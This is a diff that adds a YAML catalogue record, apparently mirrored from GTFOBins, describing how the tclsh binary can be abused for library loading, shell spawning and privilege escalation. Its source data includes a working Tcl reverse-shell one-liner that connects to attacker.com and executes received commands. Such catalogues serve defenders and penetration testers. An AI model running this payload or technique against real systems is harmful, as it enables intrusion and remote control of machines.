@@ -1,0 +1,106 @@
+id: gtfobins/tclsh/library-load/capabilities
+type: binary
+platform: linux
+name: tclsh
+phases:
+- execution
+- persistence
+- privilege-escalation
+capabilities:
+- library-load
+privilege_required: capability
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: GPL-3.0
+  upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+  last_synced: '2026-11-13'
+commands:
+- template: 'tclsh
+
+    load /path/to/lib.so x'
+references:
+- https://gtfobins.github.io/gtfobins/tclsh/
+tags:
+- linux
+- unix
+- gtfobins
+source_data:
+  GTFOBins:
+    raw:
+      documents:
+        tclsh:
+          functions:
+            library-load:
+            - code: 'tclsh
+
+                load /path/to/lib.so x'
+              contexts:
+                capabilities: null
+                sudo: null
+                suid: null
+                unprivileged: null
+            reverse-shell:
+            - code: 'tclsh
+
+                set s [socket attacker.com 12345];while 1 { puts -nonewline $s "> ";flush $s;gets $s c;set
+                e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;'
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+              listener: tcp-server
+            shell:
+            - code: tclsh
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+    upstream_url: https://gtfobins.github.io/gtfobins/tclsh/
+    upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: library-load
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  phases:
+  - value: execution
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  - value: persistence
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  - value: privilege-escalation
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  privilege_required:
+    value: capability
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    GTFOBins: sha256:95d95755204b8b9f45695f4acad12f4e618db6838f35cf9b8bb5fe08ebbedbdb
